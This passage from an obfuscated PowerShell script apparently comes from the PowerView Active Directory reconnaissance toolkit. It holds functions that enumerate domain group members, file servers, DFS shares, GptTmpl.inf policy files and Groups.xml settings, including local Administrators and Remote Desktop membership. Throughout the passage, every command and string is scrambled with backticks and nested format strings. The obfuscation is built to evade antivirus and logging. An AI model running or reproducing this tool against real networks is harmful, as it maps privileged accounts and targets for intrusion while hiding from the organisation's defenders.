                        ${ISg`Ro`UP} = ${tR`Ue}
                    }
                    else {
                        ${i`sGRoUp} = ${f`ALSE}
                    }

                    if (${f`U`lLdatA}) {
                        ${Gr`o`UpMe`MbER} = &("{3}{1}{0}{2}" -f ("{0}{1}{2}"-f'DA','PP','roper'),'-L','ty',("{0}{1}{2}"-f'Co','n','vert')) -Properties ${PrO`PERti`es}
                    }
                    else {
                        ${GR`O`Upmemb`er} = &("{1}{0}{2}" -f("{1}{0}" -f 'Obj','-'),'New','ect') ("{1}{0}" -f ("{1}{2}{0}" -f 'ect','SO','bj'),'P')
                    }

                    ${G`R`OUp`mEMBEr} | &("{1}{2}{0}" -f ("{2}{1}{0}"-f'er','emb','M'),'Ad','d-') ("{1}{0}{2}" -f("{0}{1}"-f 'e','propert'),'Not','y') ("{3}{2}{0}{1}"-f'm','ain','pDo',("{1}{0}"-f'ou','Gr')) ${dom`AIN}
                    ${g`RoupmEm`BeR} | &("{1}{0}{2}"-f'd-','Ad',("{1}{0}"-f'r','Membe')) ("{0}{1}{2}"-f ("{0}{2}{1}" -f 'Notep','p','ro'),'er','ty') ("{1}{0}{2}"-f'a',("{0}{1}"-f 'G','roupN'),'me') ${G`ROU`pFo`UndnAme}

                    try {
                        ${mEM`BeR`dn} = ${pRO`pErt`IeS}."DistiNgUi`Sh`EDN`AmE"[0]
                        
                        
                        ${ME`MB`e`RdOMA`In} = ${MEMBe`R`dN}.("{2}{1}{0}"-f ("{1}{0}"-f 'ng','tri'),'S','sub')."inVO`KE"(${MEMbEr`Dn}.("{2}{1}{0}" -f 'xOf','de','In')."i`Nvo`Ke"("DC=")) -replace 'DC=','' -replace ',','.'
                    }
                    catch {
                        ${Me`Mber`DN} = ${NU`LL}
                        ${MEm`B`eRdOm`AIn} = ${Nu`LL}
                    }

                    if (${P`RoP`eR`TiES}."sAM`Ac`cOUNTNA`me") {
                        
                        ${mem`B`erna`me} = ${p`RoPER`TI`es}."sam`AccOun`TNaME"[0]
                    } 
                    else {
                        
                        try {
                            ${MeM`BErna`ME} = &("{1}{4}{3}{2}{0}"-f ("{1}{0}"-f 'e','Nam'),("{0}{1}" -f'C','onv'),'o',("{0}{1}" -f '-','SidT'),'ert') ${Pr`oPeRT`I`ES}."c`N"[0]
                        }
                        catch {
                            
                            ${Mem`B`E`Rname} = ${PrO`P`eRTIEs}."c`N"
                        }
                    }
                    
                    if(${P`ROP`eRTI`ES}."o`BJEct`SId") {
                        ${m`EM`B`eRSiD} = ((&("{2}{0}{1}{3}" -f'bj','ec',("{0}{1}"-f'New','-O'),'t') ("{7}{0}{5}{1}{6}{2}{4}{3}"-f 'S','ci',("{0}{1}" -f'Securit','yI'),("{1}{0}{2}" -f'ifie','nt','r'),'de',("{0}{2}{1}"-f'ecu','y.Prin','rit'),("{0}{1}"-f 'pa','l.'),("{1}{0}{2}"-f'e','Syst','m.')) ${Pr`Op`ERTi`es}."oB`ject`Sid"[0],0)."v`AlUe")
                    }
                    else {
                        ${M`em`BEr`sid} = ${n`ULl}
                    }

                    ${Gr`O`Up`MEmbER} | &("{2}{0}{1}"-f 'em','ber',("{1}{0}"-f'd-M','Ad')) ("{3}{2}{0}{1}"-f 'ro',("{0}{1}" -f 'p','erty'),("{1}{0}" -f 'p','ote'),'N') ("{2}{0}{1}{3}"-f ("{1}{0}"-f'rD','be'),'om','Mem','ain') ${m`eMB`ERdOMaIN}
                    ${gROu`p`memb`Er} | &("{0}{1}{2}"-f 'A',("{1}{0}"-f 'M','dd-'),("{1}{0}" -f 'r','embe')) ("{2}{3}{0}{1}"-f't','y',("{0}{1}" -f 'N','ote'),("{0}{1}"-f'pr','oper')) ("{3}{2}{0}{1}" -f'Na','me',("{0}{1}"-f'mbe','r'),'Me') ${mEmB`E`RNAME}
                    ${G`Ro`UP`MEMBER} | &("{1}{2}{3}{0}"-f 'ber','Ad','d',("{1}{0}"-f 'Mem','-')) ("{0}{3}{1}{2}"-f'No',("{1}{0}" -f'pe','ro'),'rty','tep') ("{1}{2}{0}{3}"-f 'erS','Me','mb','id') ${mEmb`Ers`id}
                    ${GROuPmE`M`BER} | &("{2}{0}{1}" -f("{1}{0}"-f'mbe','e'),'r',("{1}{0}"-f 'dd-M','A')) ("{2}{1}{0}"-f'y',("{0}{1}" -f 'oper','t'),("{0}{1}{2}"-f'Not','ep','r')) ("{0}{1}" -f 'Is',("{1}{0}"-f'oup','Gr')) ${isGr`OUp}
                    ${grOU`PME`MbEr} | &("{1}{0}{2}"-f("{0}{1}"-f 'e','mbe'),("{0}{1}" -f'Ad','d-M'),'r') ("{1}{2}{0}{3}" -f'r','No',("{2}{0}{1}" -f 'rop','e','tep'),'ty') ("{1}{2}{0}"-f("{0}{1}"-f'er','DN'),'M','emb') ${meM`BE`RdN}
                    ${GROUpMEM`B`Er}

                    
                    if (${Rec`U`RSE} -and !${Us`EM`A`TChIngrULe} -and ${i`sG`Roup} -and ${M`em`BER`NAMe}) {
                        &("{5}{1}{4}{2}{0}{3}"-f'mbe','tG','pMe','r','rou',("{0}{1}" -f'Get-N','e')) -FullData -Domain ${me`mberdo`M`AIn} -DomainController ${D`OMAi`NCO`NTro`LlEr} -GroupName ${ME`mbErN`Ame} -Recurse -PageSize ${P`AG`EsIZe}
                    }
                }

            }
        }
    }
}


function geT-N`Et`FILeS`e`R`VeR {


    [CmdletBinding()]
    param(
        [String]
        ${doM`A`iN},

        [String]
        ${dO`maiN`CONtRo`l`LER},

        [String[]]
        ${T`A`R`GEtUSErS},

        [ValidateRange(1,10000)] 
        [Int]
        ${pA`gEsiZe} = 200
    )

    function SpLit`p`Ath {
        
        param([String]${PA`Th})

        if (${p`ATh} -and (${p`Ath}.("{0}{1}"-f'spl','it')."Inv`OKE"("\\")."c`OUNT" -ge 3)) {
            ${Te`Mp} = ${PA`TH}.("{0}{1}" -f'sp','lit')."in`Vo`ke"("\\")[2]
            if(${tE`mP} -and (${te`MP} -ne '')) {
                ${t`EmP}
            }
        }
    }

    &("{0}{3}{2}{1}" -f 'G','er','Us',("{1}{0}{2}" -f '-Ne','et','t')) -Domain ${D`oMaIN} -DomainController ${dOM`Ai`NcoN`TROllEr} -PageSize ${p`AGeSi`Ze} | &("{1}{3}{2}{0}" -f ("{0}{1}"-f 're-Ob','ject'),'W','e','h') {${_}} | &("{3}{0}{2}{1}" -f ("{1}{0}"-f '-O','ere'),'ct','bje','Wh') {
            
            if(${Tar`gEtu`SERS}) {
                ${T`Ar`geTu`SErs} -Match ${_}."saMAC`c`o`UNTnAMe"
            }
            else { ${TR`Ue} } 
        } | &("{2}{0}{1}"-f'c','t',("{1}{3}{2}{0}" -f '-Obje','Fore','ch','a')) {
            
            if(${_}."H`oMEdire`C`TORy") {
                &("{0}{1}" -f("{0}{1}" -f'Spl','itPat'),'h')(${_}."ho`mEDiRECt`orY")
            }
            if(${_}."scRIp`TP`A`TH") {
                &("{2}{1}{0}" -f'ath',("{1}{0}" -f'P','plit'),'S')(${_}."s`c`RiPtpAth")
            }
            if(${_}."P`R`OfIlEPaTH") {
                &("{1}{2}{0}" -f ("{0}{1}" -f 'Pa','th'),'Sp','lit')(${_}."PR`O`FiLePath")
            }

        } | &("{1}{3}{0}{2}"-f ("{1}{2}{0}" -f 'ec','e-Ob','j'),'Wh','t','er') {${_}} | &("{2}{1}{0}{3}" -f'j',("{1}{0}" -f't-Ob','or'),'S','ect') -Unique
}


function Ge`T-Df`ssh`ARE {


    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        ${vEr`S`iOn} = "All",

        [String]
        ${D`o`MaIn},

        [String]
        ${DoM`A`i`NCOn`TrOlLer},

        [String]
        ${ads`p`AtH},

        [ValidateRange(1,10000)] 
        [Int]
        ${P`AG`e`SIzE} = 200
    )

    function GE`T-D`FSsHa`Re`V1 {
        [CmdletBinding()]
        param(
            [String]
            ${Dom`AIn},

            [String]
            ${doMAIncoNTr`O`LL`er},

            [String]
            ${a`Dsp`AtH},

            [ValidateRange(1,10000)] 
            [Int]
            ${PA`Ges`IZE} = 200
        )

        ${d`FsS`EARCH`Er} = &("{0}{2}{1}{4}{5}{3}" -f("{0}{1}" -f'G','et-'),'ain','Dom','her','S',("{0}{1}"-f 'ear','c')) -Domain ${do`MaiN} -DomainController ${D`OMaINcont`R`oLl`Er} -ADSpath ${aD`sP`ATh} -PageSize ${p`AG`Esize}

        if(${df`S`SEaRCH`eR}) {
            ${dfssHA`R`ES} = @()
            ${Dfs`SE`ArcH`Er}."Fi`L`TER" = ("{1}{4}{2}{0}{3}" -f 'Df',((("{1}{0}" -f '(objec','(&'))),("{0}{1}" -f's=','fT'),'s))',("{1}{0}"-f 'Clas','t'))

            try {
                ${D`Fs`SEarCh`er}.("{1}{0}" -f ("{0}{1}" -f 'ndAl','l'),'Fi')."I`NvO`kE"() | &("{3}{1}{0}{2}"-f 'ec',("{1}{0}"-f'j','e-Ob'),'t',("{1}{0}"-f'r','Whe')) {${_}} | &("{1}{0}{2}{4}{3}"-f ("{0}{1}"-f'rEa','c'),'Fo','h-','ect','Obj') {
                    ${PRo`PEr`T`iEs} = ${_}."PR`o`peRTIeS"
                    ${rEmotEN`A`MeS} = ${pR`opERtI`ES}."R`EMO`TEse`R`VERnA`me"

                    ${dF`s`sHArEs} += ${ReMo`Te`NAMES} | &("{1}{2}{3}{0}" -f ("{0}{1}" -f 'Obj','ect'),'For',("{1}{0}" -f 'h','Eac'),'-') {
                        try {
                            if ( ${_}.("{2}{0}{1}" -f ("{0}{1}"-f 'o','ntain'),'s','C')."I`N`VOKe"('\') ) {
                                &("{2}{1}{0}"-f ("{0}{1}" -f'bje','ct'),("{1}{0}"-f'O','ew-'),'N') -TypeName ("{0}{2}{1}"-f 'P','ect',("{1}{0}" -f'bj','SO')) -Property @{("{0}{1}"-f 'Nam','e')=${pRO`PER`TiES}."Na`Me"[0];("{4}{3}{1}{0}{2}" -f'ver',("{1}{0}" -f'Ser','e'),("{0}{1}"-f'Na','me'),'ot','Rem')=${_}.("{0}{1}" -f 's',("{0}{1}"-f 'pl','it'))."i`NVO`KE"("\")[2]}
                            }
                        }
                        catch {
                            &("{3}{0}{2}{1}" -f'eb','g','u',("{1}{0}" -f'D','Write-')) ('Err'+'or '+'in'+' '+("{2}{1}{0}" -f'rsin','a','p')+'g '+'D'+'FS '+'sha'+'re'+' '+': '+"$_")
                        }
                    }
                }
            }
            catch {
                &("{2}{0}{1}{3}"-f("{0}{1}{2}"-f'r','ite','-W'),'arn','W','ing') ('Get'+'-'+("{2}{0}{1}" -f 'FSshareV2',' ','D')+'e'+'rr'+'or '+': '+"$_")
            }
            ${dfSsH`AR`Es} | &("{2}{1}{0}" -f 'ect',("{0}{1}"-f '-O','bj'),("{1}{0}"-f'ort','S')) -Property ("{2}{1}{0}{3}" -f ("{0}{1}" -f'e','rNa'),'v',("{1}{2}{0}"-f 'oteSer','R','em'),'me')
        }
    }

    function gE`T-DF`S`ShareV2 {
        [CmdletBinding()]
        param(
            [String]
            ${DO`maiN},

            [String]
            ${dOM`Ai`N`Con`TRoL`LeR},

            [String]
            ${aDSP`ATh},

            [ValidateRange(1,10000)] 
            [Int]
            ${Pa`ge`SiZe} = 200
        )

        ${d`FSSEaRCh`Er} = &("{1}{0}{3}{2}" -f 't-D','Ge',("{1}{0}" -f'r','arche'),("{1}{0}"-f'Se','omain')) -Domain ${d`omaIN} -DomainController ${dOMA`inCo`NTRo`ll`Er} -ADSpath ${ads`pa`Th} -PageSize ${PagES`i`zE}

        if(${Df`s`sEARCHeR}) {
            ${D`F`SSHAR`Es} = @()
            ${DFSSe`A`Rc`hEr}."Fil`T`eR" = (("{2}{6}{3}{1}{5}{0}{4}" -f("{0}{2}{1}"-f 'DFS','ink','-L'),'tCl','(',("{1}{0}" -f 'ec','bj'),((("{0}{1}"-f'v2)',')'))),("{1}{0}" -f 'ss=ms','a'),'&(o'))
            ${dfSSeaRC`h`Er}."P`RopERT`I`E`sTOload".("{1}{0}"-f("{1}{0}" -f 'dRange','d'),'A')."in`VOKE"((("{4}{0}{1}{3}{2}" -f("{0}{1}" -f 's','-li'),("{0}{1}" -f'nkp','at'),'2','hv',("{0}{1}"-f 'msd','f')),("{0}{2}{1}{3}"-f'ms',("{1}{0}{2}"-f'S-Targ','F','etL'),'D',("{1}{0}"-f 'tv2','is'))))

            try {
                ${dFs`Se`Ar`cher}.("{0}{1}" -f("{1}{0}{2}"-f'in','F','dAl'),'l')."inV`o`kE"() | &("{0}{1}{2}" -f'W',("{2}{0}{1}" -f'e','re-Obj','h'),'ect') {${_}} | &("{2}{4}{1}{3}{0}" -f 't','Obj','Fo','ec',("{0}{1}" -f'rEa','ch-')) {
                    ${prOp`eR`TIES} = ${_}."P`RO`peR`TiES"
                    ${TaRg`et_LI`st} = ${p`ROpE`RtieS}.'msdfs-targetlistv2'[0]
                    ${X`mL} = [xml] (  &("{0}{1}{3}{2}" -f'g','E',("{1}{0}{2}"-f 'Ia','Ar','blE'),'T-V') ('B7'+'8K')  -vALueONl )::"UN`IcO`DE"."geT`stRi`NG"(${t`ArGeT_`LI`sT}[2..(${ta`R`geT`_LIsT}."l`ENgtH"-1)])
                    ${d`F`SsHaREs} += ${x`ML}."taRGE`TS"."ch`il`DNoDES" | &("{2}{0}{1}{3}{4}"-f 'c','h-',("{1}{0}" -f'a','ForE'),("{0}{1}" -f 'O','bjec'),'t') {
                        try {
                            ${t`ArgET} = ${_}."iN`NeRTEXt"
                            if ( ${ta`R`gEt}.("{2}{0}{1}" -f 'n',("{1}{0}"-f 'ins','ta'),'Co')."i`N`VOke"('\') ) {
                                ${D`FsRo`oT} = ${tAR`g`Et}.("{1}{0}"-f ("{1}{0}" -f 'lit','p'),'s')."In`V`Oke"("\")[3]
                                ${s`h`AreNAmE} = ${PRoP`eRTI`es}.'msdfs-linkpathv2'[0]
                                &("{0}{1}{2}" -f'Ne','w',("{2}{1}{0}" -f 'ct','e','-Obj')) -TypeName ("{2}{1}{0}"-f't',("{1}{0}" -f'ec','Obj'),'PS') -Property @{("{0}{1}" -f 'Nam','e')="$DFSroot$ShareName";("{3}{1}{2}{0}"-f'e',("{1}{0}" -f 'N','ver'),'am',("{2}{1}{0}"-f 'Ser','te','Remo'))=${tA`RGEt}.("{1}{0}"-f 't',("{0}{1}" -f 'sp','li'))."iN`VO`ke"("\")[2]}
                            }
                        }
                        catch {
                            &("{2}{0}{1}" -f'D',("{0}{1}"-f'e','bug'),("{1}{0}{2}"-f'i','Wr','te-')) ('Err'+'or '+'in'+' '+'par'+'s'+("{1}{0}" -f' ','ing')+'ta'+("{0}{1}" -f 'rg','et')+' '+': '+"$_")
                        }
                    }
                }
            }
            catch {
                &("{2}{1}{0}"-f("{1}{0}"-f 'ing','rn'),("{0}{1}" -f 'e','-Wa'),("{0}{1}" -f'Wr','it')) ('Ge'+'t-D'+'FS'+'sha'+("{1}{0}"-f 'V2 ','re')+'e'+("{1}{0}" -f 'r ','rro')+': '+"$_")
            }
            ${dfs`sHAR`Es} | &("{1}{0}{2}"-f'rt','So',("{0}{1}"-f'-Obj','ect')) -Unique -Property ("{1}{3}{0}{2}"-f'Nam','R','e',("{2}{1}{3}{0}"-f 'r','oteServ','em','e'))
        }
    }

    ${dfs`shA`R`Es} = @()
    
    if ( (${v`ersion} -eq "all") -or (${ve`RSi`on}.("{0}{1}{2}"-f'en',("{1}{0}" -f'sWi','d'),'th')."I`NvOkE"("1")) ) {
        ${dfSs`H`AreS} += &("{3}{0}{2}{4}{1}" -f 'DFS','1','s',("{0}{1}" -f'Get','-'),("{1}{0}"-f'V','hare')) -Domain ${d`oMA`iN} -DomainController ${dO`mAiN`cOnTr`OL`lEr} -ADSpath ${aDS`PATh} -PageSize ${P`A`GEs`IZe}
    }
    if ( (${vERsI`on} -eq "all") -or (${vErS`ioN}.("{1}{0}"-f("{1}{2}{0}"-f 'ith','nds','W'),'e')."i`NVOKE"("2")) ) {
        ${d`F`sShA`REs} += &("{2}{3}{0}{1}" -f 's',("{0}{1}{2}"-f 'h','ar','eV2'),'G',("{0}{1}"-f 'e','t-DFS')) -Domain ${do`mA`In} -DomainController ${DO`m`Ain`C`ONtRoller} -ADSpath ${AdS`paTh} -PageSize ${p`AGEsI`ze}
    }

    ${DFssH`Ar`eS} | &("{3}{0}{1}{2}" -f'or',("{1}{0}" -f '-Ob','t'),("{0}{1}"-f'jec','t'),'S') -Property ("{1}{2}{3}{0}{4}"-f ("{1}{0}" -f 'N','rver'),("{0}{1}"-f 'Rem','o'),'te','Se','ame')
}








function G`et-GpTT`Mpl {


    [CmdletBinding()]
    Param (
        [Parameter(MAnDaTorY=${tR`Ue}, VAlUefROMpIPElINe=${t`Rue})]
        [String]
        ${g`PTtMplP`Ath},

        [Switch]
        ${usEp`s`DrivE}
    )

    begin {
        if(${u`sEpsDr`IvE}) {
            
            ${P`A`RTS} = ${Gp`Ttm`P`lpatH}.("{1}{0}" -f 't',("{0}{1}" -f 'sp','li'))."I`NVOKE"('\')
            ${Fo`lDerP`ATH} = ${pA`RTs}[0..(${Pa`Rts}."LE`N`GTh"-2)] -join '\'
            ${F`ILeP`Ath} = ${PA`RTS}[-1]
            ${Ra`NdD`RIVe} = (("{3}{4}{7}{1}{5}{0}{2}{6}" -f 'pqr','ghi',("{1}{0}" -f'w','stuv'),'a','bcd',("{1}{0}"-f'lmno','jk'),'xyz','ef').("{2}{1}{0}" -f ("{0}{1}"-f'Arra','y'),'ar',("{0}{1}"-f'T','oCh'))."in`VOKE"() | &("{2}{0}{1}"-f ("{0}{1}{2}"-f'et-R','an','do'),'m','G') -Count 7) -join ''
            
            &("{2}{1}{3}{0}" -f'se','r','W',("{3}{2}{0}{1}" -f 'erb','o','te-V','i')) ('Mou'+("{0}{1}"-f'nting',' ')+'p'+("{0}{1}" -f 'ath',' ')+("$GptTmplPath "+'')+("{0}{1}"-f 'u','sin')+'g '+'a '+'t'+("{0}{1}"-f'e','mp ')+'PS'+("{0}{1}" -f'Dri','v')+'e '+'at'+' '+"$RandDrive")

            try {
                ${n`ULl} = &("{3}{1}{0}{2}"-f'Dr','S','ive',("{0}{1}" -f 'New-','P')) -Name ${r`A`NddrivE} -PSProvider ("{3}{1}{2}{0}" -f("{0}{1}" -f 'ys','tem'),'ile','S','F') -Root ${FolD`Er`P`Ath}  -ErrorAction ("{0}{1}" -f'Sto','p')
            }
            catch {
                &("{2}{0}{1}" -f't',("{0}{1}{2}"-f'e-Deb','u','g'),'Wri') ('Er'+("{1}{0}"-f 'r ','ro')+("{0}{1}"-f 'mo','unt')+'ing'+' '+'pat'+'h '+("$GptTmplPath "+'')+': '+"$_")
                return ${n`ULl}
            }

            
            ${gP`TtMpLP`A`TH} = ${r`A`NDdrIVe} + ":\" + ${f`ILe`Path}
        } 
    }

    process {
        ${S`eCtiOnn`A`me} = ''
        ${SeCT`IO`N`ST`EMP} = @{}
        ${SEctI`oNSfIN`Al} = @{}

        try {

            if(&("{2}{1}{0}"-f("{0}{1}"-f'Pa','th'),'t-','Tes') ${g`pTtMPL`paTH}) {

                &("{1}{0}{3}{2}" -f 'rbo',("{0}{2}{1}"-f 'Wri','Ve','te-'),'e','s') (("{1}{0}" -f 'rs','Pa')+("{1}{0}"-f 'g ','in')+"$GptTmplPath")

                &("{0}{2}{1}"-f'Get',("{2}{0}{1}" -f 'on','tent','C'),'-') ${gpt`TMp`lp`AtH} -ErrorAction ("{1}{0}"-f 'op','St') | &("{2}{1}{0}{3}"-f 'c',("{1}{2}{0}" -f 'bje','rea','ch-O'),'Fo','t') {
                    if (${_} -match '\[') {
                        
                        ${sE`CtiO`Nn`AmE} = ${_}."TR`im"('[]') -replace ' ',''
                    }
                    elseif(${_} -match '=') {
                        ${P`ARtS} = ${_}.("{0}{1}" -f 's',("{0}{1}" -f'p','lit'))."I`NVoKE"('=')
                        ${P`Ro`pErTYna`mE} = ${Pa`R`Ts}[0].("{0}{1}" -f'tri','m')."i`NVOKE"()
                        ${pr`Op`Er`TYVaLu`es} = ${p`Ar`Ts}[1].("{0}{1}" -f't','rim')."INv`okE"()

                        if(${pR`OPe`RtY`VaL`UEs} -match ',') {
                            ${PRo`PErT`y`Values} = ${pR`oPeRt`y`VAluEs}.("{0}{1}"-f'sp','lit')."i`NV`OkE"(',')
                        }

                        if(!${S`ecTio`NsT`Emp}[${S`EctI`O`NNamE}]) {
                            ${s`ecTi`ONST`eMP}.("{1}{0}" -f 'd','Ad')."I`NVoKe"(${SeCTiOn`Na`ME}, @{})
                        }

                        
                        ${S`EC`T`Ions`TeMp}[${sec`Ti`on`NAme}].("{0}{1}" -f 'A','dd')."IN`Voke"( ${P`ROpe`Rt`yNaMe}, ${P`ROp`eRtY`V`ALueS} )
                    }
                }

                ForEach (${sE`cti`on} in ${Sec`T`IoNSteMp}."k`Eys") {
                    
                    ${SEc`TiOn`sFINal}[${Sec`TIoN}] = &("{1}{0}{2}" -f'e',("{2}{0}{1}"-f 'O','bj','New-'),'ct') ("{0}{1}{2}" -f 'PSO','bj','ect') -Property ${SecTio`N`sTEMp}[${s`ECt`iOn}]
                }

                
                &("{0}{1}{2}" -f 'N',("{1}{0}" -f 'w-O','e'),("{0}{1}"-f 'bjec','t')) ("{1}{0}" -f'ct',("{0}{1}"-f'P','SObje')) -Property ${s`Ec`TI`onSFI`NAl}
            }
        }
        catch {
            &("{3}{0}{2}{1}" -f 'r','ug',("{0}{1}{2}" -f'i','te-','Deb'),'W') ('Err'+'or'+' '+("{1}{0}" -f'i','pars')+'ng'+' '+("$GptTmplPath "+'')+': '+"$_")
        }
    }

    end {
        if(${u`sEP`sDRiVe} -and ${Ra`Ndd`RIVe}) {
            &("{1}{0}{2}"-f ("{0}{1}" -f 'r','ite-V'),'W',("{0}{1}" -f 'erbos','e')) ('Re'+("{1}{0}{2}" -f'i','mov','ng ')+'tem'+'p '+'P'+'SDr'+("{0}{1}" -f 'ive',' ')+"$RandDrive")
            &("{0}{2}{1}" -f("{0}{1}"-f 'Ge','t-'),'ve',("{0}{1}" -f 'PSDr','i')) -Name ${r`And`DRIVE} -ErrorAction ("{3}{0}{2}{4}{1}"-f'ile','e',("{1}{0}"-f 'y','ntl'),'S',("{2}{1}{0}"-f 'nu','nti','Co')) | &("{2}{1}{0}{3}" -f ("{2}{1}{3}{0}" -f'ri','ve-P','o','SD'),'em','R','ve')
        }
    }
}


function GEt-g`RO`UPsX`ML {


    [CmdletBinding()]
    Param (
        [Parameter(maNDAToRy=${TR`Ue}, vALueFrOMpiPElIne=${t`RUe})]
        [String]
        ${grOuP`S`x`M`lpath},

        [Switch]
        ${R`e`SOlVe`sids},

        [Switch]
        ${uSEps`dRI`VE}
    )

    begin {
        if(${U`SEP`SdrI`Ve}) {
            
            ${p`ARts} = ${G`ROu`PSXML`PatH}.("{0}{1}"-f ("{1}{0}" -f 'li','sp'),'t')."iNv`okE"('\')
            ${fO`LDe`RpA`TH} = ${PA`R`Ts}[0..(${pa`R`TS}."leN`gth"-2)] -join '\'
            ${fI`lE`PAtH} = ${p`ArtS}[-1]
            ${R`And`drIVE} = (("{5}{1}{0}{4}{3}{2}" -f("{1}{0}"-f'fg','de'),'c',("{1}{0}{2}"-f'tuv','s','wxyz'),'r',("{1}{0}{2}" -f'ijkl','h','mnopq'),'ab').("{2}{1}{0}" -f("{1}{0}"-f'rray','A'),'r',("{1}{0}" -f'a','ToCh'))."I`NvO`Ke"() | &("{1}{0}{2}" -f'o',("{2}{0}{1}"-f '-R','and','Get'),'m') -Count 7) -join ''
            
            &("{2}{1}{3}{4}{0}"-f 'ose','-V',("{0}{1}" -f'W','rite'),'e','rb') (("{0}{1}"-f'Mou','n')+'tin'+'g'+' '+'pat'+'h '+("$GroupsXMLPath "+'')+'us'+'i'+'ng '+'a '+("{0}{1}" -f 't','emp')+' '+'P'+'SD'+("{1}{0}" -f'e ','riv')+'at'+' '+"$RandDrive")

            try {
                ${Nu`Ll} = &("{0}{2}{1}"-f("{0}{1}"-f 'New','-PS'),'ve','Dri') -Name ${ran`dd`Rive} -PSProvider ("{0}{1}{2}"-f 'Fi',("{1}{0}" -f's','leSy'),'tem') -Root ${Fo`lDeRP`A`Th}  -ErrorAction ("{1}{0}"-f'top','S')
            }
            catch {
                &("{1}{0}{2}"-f 'e-D',("{0}{1}"-f'W','rit'),("{1}{0}" -f 'g','ebu')) ('Err'+'or '+("{1}{0}"-f 'oun','m')+("{1}{0}" -f'ng ','ti')+'pa'+'th '+("$GroupsXMLPath "+'')+': '+"$_")
                return ${Nu`lL}
            }

            
            ${grOUp`sxm`Lp`Ath} = ${rANDdr`i`Ve} + ":\" + ${f`i`lePATh}
        } 
    }

    process {

        
        if(&("{2}{0}{1}"-f't-P','ath','Tes') ${gr`OuPSX`MLPaTH}) {

            [xml] ${gR`o`U`PSXMLcoNtENt} = &("{2}{1}{0}{3}"-f 'en',("{0}{1}"-f'-','Cont'),'Get','t') ${Gro`U`pSXM`LPaTh}

            
            ${g`R`O`UPSx`mL`coNTeNT} | &("{0}{3}{2}{1}" -f 'Se',("{1}{0}"-f'Xml','ct-'),'e','l') ("{1}{2}{0}" -f 'up','//','Gro') | &("{3}{1}{0}{2}" -f'e',("{1}{2}{0}" -f '-Obj','el','ect'),'ct','S') -ExpandProperty ("{1}{0}"-f 'de','no') | &("{1}{2}{0}{3}"-f'c','F',("{0}{1}{3}{2}" -f'or','Ea','h-Obje','c'),'t') {

                ${mE`mBers} = @()
                ${M`EmBE`Rof} = @()

                
                ${LOc`A`LsiD} = ${_}."p`ROPe`RTiES"."GRO`U`PSiD"
                if(!${loCAL`SID}) {
                    if(${_}."proP`Er`Ti`es"."g`Ro`UPnaMe" -match ("{0}{2}{3}{1}" -f ("{0}{1}" -f'Adm','i'),'s','ni',("{0}{2}{1}"-f's','ator','tr'))) {
                        ${Lo`caLsiD} = ("{3}{2}{1}{0}" -f'544',("{1}{0}"-f'2-','-3'),'5',("{0}{1}" -f'S-','1-'))
                    }
                    elseif(${_}."pRoPert`I`ES"."GRo`U`p`NamE" -match ("{0}{2}{1}{3}" -f'Rem','k',("{0}{1}"-f'ote De','s'),'top')) {
                        ${lo`CaL`sID} = ("{3}{2}{1}{0}" -f'55','2-5',("{1}{0}"-f '3','1-5-'),'S-')
                    }
                    else {
                        ${Lo`cals`id} = ${_}."p`Ro`pE`RtiES"."gROUP`N`AmE"
                    }
                }
                ${ME`Mb`eROf} = @(${loc`ALs`iD})

                ${_}."p`ROpErt`iEs"."MeMBE`Rs" | &("{0}{2}{1}" -f("{0}{2}{1}"-f 'F','ch','orEa'),'ct',("{0}{1}"-f'-Ob','je')) {
                    
                    ${_} | &("{1}{0}{2}"-f("{0}{1}"-f'bj','ec'),("{0}{1}{2}" -f 'Selec','t','-O'),'t') -ExpandProperty ("{1}{0}"-f("{1}{0}" -f'mber','e'),'M') | &("{1}{0}{2}" -f("{1}{0}" -f 'j','e-Ob'),("{0}{1}"-f 'Wh','er'),'ect') { ${_}."acTI`on" -match 'ADD' } | &("{1}{2}{3}{0}" -f 'ct',("{1}{0}{2}"-f 'rEa','Fo','ch-'),'Ob','je') {

                        if(${_}."s`id") {
                            ${m`EMBers} += ${_}."s`ID"
                        }
                        else {
                            
                            ${m`Embe`RS} += ${_}."na`ME"
                        }
                    }
                }

                if (${ME`M`BERS} -or ${mE`Mb`EroF}) {
                    
                    ${FILt`e`Rs} = ${_}."F`I`lTErS" | &("{2}{0}{1}"-f ("{0}{1}"-f 'h','-Objec'),'t',("{0}{1}"-f'For','Eac')) {
                        ${_} | &("{1}{0}{2}" -f 'e','S',("{2}{1}{0}{3}" -f 'Obje','t-','lec','ct')) -ExpandProperty ("{2}{0}{1}" -f'ter','*','Fil') | &("{2}{1}{0}" -f ("{1}{0}" -f't','Objec'),'-',("{1}{0}" -f 'rEach','Fo')) {
                            &("{2}{0}{1}" -f ("{0}{1}"-f 'w-O','bje'),'ct','Ne') -TypeName ("{0}{1}{2}" -f ("{1}{0}" -f'SOb','P'),'jec','t') -Property @{("{1}{0}" -f 'ype','T') = ${_}."Loca`lN`AME";("{0}{1}" -f'V',("{0}{1}"-f'al','ue')) = ${_}."NA`mE"}
                        }
                    }

                    if(${res`OLVES`iDs}) {
                        ${MeM`Ber`Of} = ${Me`m`BeRoF} | &("{2}{1}{3}{0}" -f("{1}{0}" -f 'ject','Ob'),'h',("{1}{0}"-f 'ac','ForE'),'-') {&("{3}{1}{0}{2}" -f 'm',("{0}{1}{2}" -f '-','Si','dToNa'),'e',("{0}{1}{2}" -f'Conv','e','rt')) ${_}}
                        ${mE`MBE`RS} = ${MEm`BE`RS} | &("{0}{3}{1}{2}"-f 'For','ch-',("{1}{2}{0}" -f't','Ob','jec'),'Ea') {&("{3}{0}{1}{2}" -f ("{1}{2}{0}"-f 'oN','onvert-Si','dT'),'am','e','C') ${_}}
                    }

                    if(${mE`M`BEroF} -isnot [system.array]) {${M`emb`erOf} = @(${meMB`eRof})}
                    if(${meMb`E`Rs} -isnot [system.array]) {${M`eMB`Ers} = @(${m`emB`eRS})}

                    ${g`PopRoP`E`RtIeS} = @{
                        ("{2}{1}{3}{0}{4}"-f 'ayN','P','G',("{1}{0}"-f 'spl','ODi'),'ame') = ${gPO`dIs`pLayNAme}
                        ("{1}{2}{0}" -f'e','G',("{1}{0}"-f'ONam','P')) = ${gpO`N`AmE}
                        ("{2}{1}{0}" -f'th','Pa','GPO') = ${gr`Ou`pSXmlp`ATH}
                        ("{1}{0}" -f ("{1}{0}"-f'rs','lte'),'Fi') = ${fI`l`TErS}
                        ("{1}{0}{2}" -f("{0}{1}" -f'm','ber'),'Me','Of') = ${ME`mBe`Rof}
